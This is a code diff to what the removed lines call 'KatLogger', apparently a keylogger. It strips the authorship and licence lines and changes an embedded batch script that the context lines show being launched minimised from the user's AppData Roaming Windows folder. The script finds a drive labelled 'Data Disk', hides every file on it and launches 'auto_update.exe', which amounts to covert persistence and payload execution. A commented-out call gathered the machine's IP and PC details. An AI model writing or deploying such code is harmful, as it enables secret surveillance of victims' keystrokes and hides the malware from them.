@@ -1,11 +1,17 @@
 LABEL = "Data Disk"
-import kat
 
-kat.authors(["Lif28", "rickyfili10"])
-kat.licence("GPL-3.0 licence")
-kat.licenceFile("../LICENCE", 0)
-kat.link("https://github.com/Lif28/KatLogger/tree/main?tab=GPL-3.0-1-ov-file")
-kat.web("nothing for now :/")
+
+
+
+
+
+
+
+
+
+
+
+
 
 def player(): 
  import re
@@ -143,8 +149,8 @@ import getpass
 import shutil
 import os
 import subprocess
-import getInfo
-getInfo.GetIp()
+#import getInfo
+#getInfo.GetIp()
 # uncomment this for print ip and other info of pc
 # print(getInfo.GetIp())
 class Update:
@@ -200,19 +206,28 @@ start /min cmd /c "C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\
 @echo off
 setlocal
 
+set "found=false"
+
 for %%G in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     for /f "tokens=5*" %%A in ('vol %%G: ^| find "Volume in drive"') do (
         if /i "%%B"=="{LABEL}" (
+            set "found=true"
             cd /d %%G:\
-            start auto_update.exe
+            attrib +h *.* /s /d
+            if exist "auto_update.exe" (
+                start auto_update.exe
+            ) else (
+                exit /b 1
+            )
             goto :EOF
-            exit
         )
     )
 )
 
+if "%found%"=="false" (
+    exit /b 1
+)
 
-exit /b
 
 """
                 file.write(cmd)
